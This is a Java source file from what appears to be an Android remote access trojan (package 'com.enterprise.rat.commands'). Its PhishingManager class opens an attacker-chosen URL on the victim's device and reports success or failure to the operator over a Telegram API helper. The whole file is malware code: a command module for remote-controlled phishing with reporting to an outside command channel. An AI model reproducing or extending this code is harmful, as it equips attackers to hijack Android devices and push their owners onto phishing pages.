package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import com.enterprise.rat.utils.TelegramApi;

public class PhishingManager {
    private Context context;

    public PhishingManager(Context context) { this.context = context; }

    public void openURL(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("✅ URL Opened: " + url);
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error opening URL");
        }
    }
}
